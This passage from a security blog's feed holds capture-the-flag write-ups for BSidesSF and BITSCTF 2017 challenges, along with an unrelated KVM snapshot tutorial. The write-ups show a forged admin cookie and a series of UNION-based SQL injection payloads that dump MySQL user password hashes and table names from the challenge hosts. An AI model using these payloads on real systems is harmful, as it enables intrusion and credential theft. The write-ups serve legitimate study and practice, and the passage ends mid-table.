<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ tshark -r easycap.pcap -T fields -e data | tr -d &apos;\n&apos;</div><div class="line">464c41473a33383562383761666338363731646565303735353032393064313661383037310a%</div></pre></td></tr></table></figure></p>
<p>Now translate hex to ASCII with a little ruby trick:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):008:0&gt;</span> [<span class="string">'464c41473a33383562383761666338363731646565303735353032393064313661383037310a'</span>].pack(<span class="string">'H*'</span>)</div><div class="line">=&gt; <span class="string">"FLAG:385b87afc8671dee07550290d16a8071\n"</span></div></pre></td></tr></table></figure></p>
<p>Flag is <code>FLAG:385b87afc8671dee07550290d16a8071</code>.</p>
<h1 id="10-easy-reversing">10 - Easy - Reversing</h1>
<blockquote>
<p>This one is easy.</p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/ee2246fd415195570644107a359662e536f87c438c00a65d54b165d5534bd971" target="_blank" rel="external">easy-32</a></li>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/4d761392565db05fde85a2d5d4f254954a989a2ac39acf0357dba45bd70a4db0" target="_blank" rel="external">easy-64</a></li>
</ul>
</blockquote>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ strings easy-64 | grep -i flag</div><div class="line">FLAG:db2f62a36a018bce28e46d976e3f9864</div></pre></td></tr></table></figure></p>
<h1 id="30-easyauth-web">30 - easyauth - Web</h1>
<blockquote>
<p>Can you gain admin access to this site?</p>
<p><a href="http://easyauth-afee0e67.ctf.bsidessf.net" target="_blank" rel="external">http://easyauth-afee0e67.ctf.bsidessf.net</a></p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/cdbec071e3710a8465030f032d44e72ab2449098c9ad6597256087751d19bb39" target="_blank" rel="external">easyauth.php</a></li>
</ul>
</blockquote>
<p>Hint say to log in with: guest/guest</p>
<p>We have a cookie like this:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth=username=guest&amp;date=2017-02-13T21:09:45+0000&amp;</div></pre></td></tr></table></figure></p>
<p>If we click on the link we get the following message:</p>
<blockquote>
<p>It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(</p>
</blockquote>
<p>Configure proxy and launch burpsuite.</p>
<p>Then change <code>guest</code> into <code>administrator</code> in the cookie and send. You now get the flag:</p>
<blockquote>
<p>Congratulations, you're the administrator! Here's your reward:</p>
<p>FLAG:0076ecde2daae415d7e5ccc7db909e7e</p>
</blockquote>
<h1 id="450-vhash-crypto">450 - vhash - Crypto</h1>
<blockquote>
<p>---- Due to a bug, the challenge might be easier than intended. Enjoy the free points! ----</p>
<p>Can you gain admin access to this site?</p>
<p>(The vhash binary is what's used for signing the cookie)</p>
<p><a href="http://vhash-c6bb0e85.ctf.bsidessf.net:9292" target="_blank" rel="external">http://vhash-c6bb0e85.ctf.bsidessf.net:9292</a></p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/97a121e61a9dba819eb07de40ddad8ac23c11ee4f92055110a7c6f987c73ed83" target="_blank" rel="external">vhash.zip </a></li>
</ul>
</blockquote>
<p>The zip contain the <code>vhash</code> ELF executable and the <code>index.php</code> source:</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">require_once</span>(<span class="string">'./auth.php'</span>);</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">do_hash</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    $filename = tempnam(sys_get_temp_dir(), <span class="string">'vhash'</span>);</div><div class="line">    file_put_contents($filename, $data);</div><div class="line"></div><div class="line">    $hash = substr(`/home/ctf/vhash $filename`, <span class="number">0</span>, <span class="number">256</span>);</div><div class="line">    unlink($filename);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">create_hmac</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> do_hash(SECRET . $data);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; $_GET[<span class="string">'action'</span>] === <span class="string">'logout'</span>) &#123;</div><div class="line">    setcookie(<span class="string">'auth'</span>, <span class="string">''</span>);</div><div class="line">    header(<span class="string">'Location: index.php'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])) &#123;</div><div class="line">    <span class="comment"># Do pagey stuff</span></div><div class="line">    <span class="keyword">if</span>(is_valid($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">      <span class="comment"># Create the cookie</span></div><div class="line">      $cookie = <span class="string">'username='</span> . $_POST[<span class="string">'username'</span>] . <span class="string">'&amp;'</span>;</div><div class="line">      $cookie .= <span class="string">'date='</span> . date(DATE_ISO8601) . <span class="string">'&amp;'</span>;</div><div class="line">      $cookie .= <span class="string">'secret_length='</span> . strlen(SECRET) . <span class="string">'&amp;'</span>;</div><div class="line"></div><div class="line">      <span class="comment"># Sign the cookie</span></div><div class="line">      $cookie = create_hmac($cookie) . <span class="string">'|'</span> . $cookie;</div><div class="line">      setcookie(<span class="string">'auth'</span>, $cookie);</div><div class="line">      <span class="keyword">print</span> <span class="string">"&lt;h1&gt;Login successful!&lt;/h1&gt;\n"</span>;</div><div class="line">      <span class="keyword">print</span> <span class="string">"&lt;p&gt;Setting cookie: &lt;tt&gt;auth=$cookie&lt;/tt&gt;&lt;/p&gt;\n"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">print</span> <span class="string">"&lt;h1&gt;Username or password was incorrect!&lt;/h1&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Click &lt;a href='index.php'&gt;here&lt;/a&gt; to continue!&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'auth'</span>])) &#123;</div><div class="line">    <span class="keyword">require_once</span>(<span class="string">'./login_form.php'</span>);</div><div class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">list</span>($hmac, $cookie) = explode(<span class="string">'|'</span>, $_COOKIE[<span class="string">'auth'</span>], <span class="number">2</span>);</div><div class="line">  <span class="keyword">if</span>(create_hmac($cookie) !== $hmac) &#123;</div><div class="line">    setcookie(<span class="string">'auth'</span>, <span class="string">''</span>);</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Something was wrong with your auth cookie!&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Click &lt;a href='index.php'&gt;here&lt;/a&gt; to log in again!&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  $pairs = explode(<span class="string">'&amp;'</span>, $cookie);</div><div class="line">  $args = <span class="keyword">array</span>();</div><div class="line">  <span class="keyword">foreach</span>($pairs <span class="keyword">as</span> $pair) &#123;</div><div class="line">    <span class="keyword">if</span>(!strpos($pair, <span class="string">'='</span>))</div><div class="line">      <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">    <span class="keyword">list</span>($name, $value) = explode(<span class="string">'='</span>, $pair, <span class="number">2</span>);</div><div class="line">    $args[$name] = $value;</div><div class="line">  &#125;</div><div class="line">  $username = $args[<span class="string">'username'</span>];</div><div class="line"></div><div class="line">  <span class="keyword">print</span> <span class="string">"&lt;h1&gt;Welcome back, $username!&lt;/h1&gt;\n"</span>;</div><div class="line">  <span class="keyword">if</span>($username == <span class="string">'administrator'</span>) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Congratulations, you're the administrator! Here's your reward:&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;"</span> . FLAG . <span class="string">"&lt;/p&gt;\n"</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(&lt;/p&gt;\n"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">print</span> <span class="string">"&lt;p&gt;&lt;a href='/index.php?action=logout'&gt;Log out&lt;/a&gt;&lt;/p&gt;\n"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>Description says the challenge is more easy due to a bug, here it is:</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($username == <span class="string">'administrator'</span>)</div></pre></td></tr></table></figure></p>
<p>So the challenge is exactly like the previous <strong>30 - easyauth - Web</strong>.</p>
<p>Configure proxy and launch burpsuite.</p>
<p>Then change <code>guest</code> into <code>administrator</code> in the cookie and send. You now get the flag:</p>
<blockquote>
<p>Congratulations, you're the administrator! Here's your reward:</p>
<p>FLAG:180e2300112ef5a4f23c93cfdec8d780</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
    
      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
    
      <category term="reversing" scheme="https://rawsec.ml/tags/reversing/"/>
    
  </entry>
  
  <entry>
    <title>Snapshot for KVM via libvirt with virsh</title>
    <link href="https://rawsec.ml/en/snapshot-kvm-libvirt-virsh/"/>
    <id>https://rawsec.ml/en/snapshot-kvm-libvirt-virsh/</id>
    <published>2017-02-07T23:00:00.000Z</published>
    <updated>2017-02-07T22:03:01.578Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Libvirt_support.svg/640px-Libvirt_support.svg.png" alt=""></p>
<h2 id="context">Context</h2>
<p>I am using <em>KVM</em>, and use/manage my VMs with <em>virt-manager</em>. But I asked myself this question: how can create or revert some snapshot?</p>
<p>I'm giving examples for qcow2 disk images and commands are made with virsh.</p>
<h2 id="internal-disk-snapshots">Internal Disk Snapshots</h2>
<p>You can list available VM with virsh in order to know their name:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ virsh list</div><div class="line"> Id Name                 State</div><div class="line">----------------------------------</div><div class="line">  1 vmname               running</div></pre></td></tr></table></figure></p>
<p>Then you can check if there already is existing shapshots for this VM:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-list vmname</div><div class="line"> Name                 Creation Time             State</div><div class="line">------------------------------------------------------------</div></pre></td></tr></table></figure></p>
<p>Next there is two possibilities to make a snapshot:</p>
<ul>
<li>create a XML snapshot description file to specify the name and description of the snapshot</li>
<li>or let libvirt choose a name and no description</li>
</ul>
<p>The XML snapshot description file must look like the following:</p>
<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">domainsnapshot</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>vmname-snapshot1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>description of the snapshot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">domainsnapshot</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>Make a snapshot with an XML file:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-create vmname /path/to/description.xml</div></pre></td></tr></table></figure></p>
<p>Or make a snapshot without description file:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-create vmname</div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: this is much more faster to make a snapshot while the VM is stoped. But it's also possible to make a snapshot while the VM is running even if it's more slow.</p>
<p>If you want to see some informations about the VM and snapshots you can run:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ qemu-img info /path/to/disk/image/vmname.qcow2</div><div class="line">image: vmname.qcow2</div><div class="line">file format: qcow2</div><div class="line">virtual size: 20G (21474836480 bytes)</div><div class="line">disk size: 5.2G</div><div class="line">cluster_size: 65536</div><div class="line">Snapshot list:</div><div class="line">ID        TAG                 VM SIZE                DATE       VM CLOCK</div><div class="line">1         vmname-snapshot1   329M 2017-02-08 20:40:59   01:23:38.281</div><div class="line">2         vmname-snapshot2   375M 2017-02-08 20:46:39   01:26:01.645</div><div class="line">3         vmname-snapshot3   482M 2017-02-08 22:42:48   03:22:00.515</div><div class="line">Format specific information:</div><div class="line">    compat: 1.1</div><div class="line">    lazy refcounts: true</div><div class="line">    refcount bits: 16</div><div class="line">    corrupt: false</div></pre></td></tr></table></figure></p>
<p>To revert the VM to a snapshot, for example run:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-revert vmname vmname-snapshot1</div></pre></td></tr></table></figure></p>
<p><a href="https://kashyapc.com/2011/10/04/snapshotting-with-libvirt-for-qcow2-images/" target="_blank" rel="external">Source</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Libvirt_support.svg/640px-Libvirt_support.svg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id
    
    </summary>
    
      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
    
    
      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="https://rawsec.ml/tags/system/"/>
    
      <category term="virtualization" scheme="https://rawsec.ml/tags/virtualization/"/>
    
  </entry>
  
  <entry>
    <title>BITSCTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/BITSCTF-2017-writeups/"/>
    <id>https://rawsec.ml/en/BITSCTF-2017-writeups/</id>
    <published>2017-02-04T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : BITSCTF 2017</li>
<li><strong>Website</strong> : <a href="https://bitsctf.bits-quark.org/" target="_blank" rel="external">bitsctf.bits-quark.org</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/417" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="10-botbot-web">10 - BotBot - web</h2>
<blockquote>
<p>Should not ask for the description of a 5 marker.</p>
<p><a href="http://botbot.bitsctf.bits-quark.org" target="_blank" rel="external">botbot.bitsctf.bits-quark.org</a></p>
</blockquote>
<p>Let's look at the source code:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">	Nothing to see here. Maybe try looking up seo .txt</div><div class="line">--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>Now go to <code>http://botbot.bitsctf.bits-quark.org/robots.txt</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Useragent *</div><div class="line">Disallow: /fl4g</div></pre></td></tr></table></figure></p>
<p><a href="http://botbot.bitsctf.bits-quark.org/fl4g/" target="_blank" rel="external">http://botbot.bitsctf.bits-quark.org/fl4g/</a> :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BITCTF&#123;take_a_look_at_googles_robots_txt&#125;</div></pre></td></tr></table></figure></p>
<h2 id="20-labour-misc">20 - Labour - Misc</h2>
<blockquote>
<p>Follow your heart, for it leads you straight to the answer.</p>
</blockquote>
<p>It's a gpx file:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;</div><div class="line">&lt;gpx version=&quot;1.1&quot; creator=&quot;BITSCTF&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.topografix.com/GPX/1/1&quot; xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!--Use appropriate brackets and underscores to separate words if you succeed--&gt;</div><div class="line">&lt;wpt lat=&quot;23.71697&quot; lon=&quot;89.45508&quot;&gt;</div><div class="line">&lt;ele&gt;12.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP01-A&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;22.82885&quot; lon=&quot;80.79786&quot;&gt;</div><div class="line">&lt;name&gt;WP02-B&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.88276&quot; lon=&quot;58.81642&quot;&gt;</div><div class="line">&lt;name&gt;WP03-C&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;15.43674&quot; lon=&quot;27.65039&quot;&gt;</div><div class="line">&lt;name&gt;WP04-D&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;12.69179&quot; lon=&quot;17.50781&quot;&gt;</div><div class="line">&lt;ele&gt;288.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP05-E&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;14.91081&quot; lon=&quot;100.47656&quot;&gt;</div><div class="line">&lt;ele&gt;13.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP06-F&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;45.9267&quot; lon=&quot;2.21484&quot;&gt;</div><div class="line">&lt;ele&gt;557.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP07-G&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;4.11852&quot; lon=&quot;102.19922&quot;&gt;</div><div class="line">&lt;ele&gt;67.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP08-H&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;34.85709&quot; lon=&quot;65.84765&quot;&gt;</div><div class="line">&lt;ele&gt;3209.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP09-I&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;28.89086&quot; lon=&quot;68.30859&quot;&gt;</div><div class="line">&lt;ele&gt;116.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP10-J&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.20502&quot; lon=&quot;31.92187&quot;&gt;</div><div class="line">&lt;ele&gt;797.8&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP11-K&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;47.24344&quot; lon=&quot;19.8457&quot;&gt;</div><div class="line">&lt;ele&gt;93.5&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP12-L&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;25.30828&quot; lon=&quot;29.84765&quot;&gt;</div><div class="line">&lt;ele&gt;267&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP13-M&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;18.97119&quot; lon=&quot;-72.28521&quot;&gt;</div><div class="line">&lt;ele&gt;375&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP14-N&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;-13.61609&quot; lon=&quot;17.68359&quot;&gt;</div><div class="line">&lt;ele&gt;1510.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP15-O&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;33.84122&quot; lon=&quot;102.23438&quot;&gt;</div><div class="line">&lt;ele&gt;3426.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP16-P&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;46.89624&quot; lon=&quot;69.53907&quot;&gt;</div><div class="line">&lt;ele&gt;364.4&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP17-Q&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;/gpx&gt;</div></pre></td></tr></table></figure></p>
<p>We can open it online with:</p>
<ul>
<li><a href="http://www.visugpx.com/index.php" target="_blank" rel="external">http://www.visugpx.com/index.php</a></li>
<li><a href="http://www.gpsvisualizer.com/map?output_home" target="_blank" rel="external">http://www.gpsvisualizer.com/map?output_home</a></li>
</ul>
<p>Take the waypoint in order and write the name of the country:</p>
<ol>
<li>WP01-A - Bangladesh</li>
<li>WP02-B - India</li>
<li>WP03-C - Turkmenistan</li>
<li>WP04-D - Sudan</li>
<li>WP05-E - Chad</li>
<li>WP06-F - Thailand</li>
<li>WP07-G - France</li>
<li>WP08-H - Malesia</li>
<li>WP09-I - Afganistan</li>
<li>WP10-J - Pakistan</li>
<li>WP11-K - Turkey</li>
<li>WP12-L - Hungary</li>
<li>WP13-M - Egypt</li>
<li>WP14-N - Haiti</li>
<li>WP15-O - Angola</li>
<li>WP16-P - China</li>
<li>WP17-Q - Kazaksztan</li>
</ol>
<p>Taking the first letter of each country in order give me <strong>BITSCTFMAPTHEHACK</strong> and the comment said:</p>
<blockquote>
<p>Use appropriate brackets and underscores to separate words if you succeed</p>
</blockquote>
<p>So I get <strong>BITSCTF{MAP_THE_HACK}</strong></p>
<h1 id="30-batman-vs-joker-web">30 - Batman vs Joker - Web</h1>
<blockquote>
<p>Joker has left a message for you. Your job is to get to the message asap.</p>
<p><a href="http://joking.bitsctf.bits-quark.org" target="_blank" rel="external">joking.bitsctf.bits-quark.org</a></p>
</blockquote>
<p>Try a quick <code>' or 1=1 #'</code>: this is working so we have a vulnerable MySQL database.</p>
<p>Let's enjoy SQLi.</p>
<p>Just curious to know the DB version: <code>' or 1=1 UNION SELECT @@version,1 #</code>: <strong>5.5.54-0+deb8u1</strong></p>
<p>Current databse name: <code>' or 1=1 UNION SELECT database(),1 #</code>: <strong>hack</strong></p>
<p>Just curious to list the databse users: <code>' or 1=1 UNION SELECT host, user FROM mysql.user #</code> and <code>' or 1=1 UNION SELECT user, password FROM mysql.user #</code>:</p>
<table>
<thead>
<tr>
<th>host</th>
<th>user</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr>
<td>%</td>
<td>tester</td>
<td>*975B2CD4FF9AE554FE8AD33168FBFC326D2021DD</td>
</tr>
<tr>
<td>127.0.0.1, 33842653d6db, ::1, localhost</td>
<td>root</td>
<td>*A2AE2E3109CE064A1AED30C0E71E021540F30700</td>
</tr>
<tr>
<td>localhost</td>
<td>debian-sys-maint</td>
<td>*A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F</td>
</tr>
</tbody>
</table>
<p>I want to know the name of tables in the hack databse: <code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = 'hack' #</code>:</p>
<table>
<thead>
<tr>
<th>table_schema</th>
<th>table_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>hack</td>
<td>CIA_Official_Records</td>
</tr>
<tr>
<td>hack</td>
<td>joker</td>
</tr>
</tbody>
</table>
<p>And finally I want to know the name of columns in the both previous tables: <code>' or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'CIA_Official_Records' or table_name = 'joker' #</code>:</p>
<table>
<thead>
<tr>
<th>table_name</th>
<th>column_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>CIA_Official_Records</td>
<td>id</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>username</td>
</tr>
<tr>
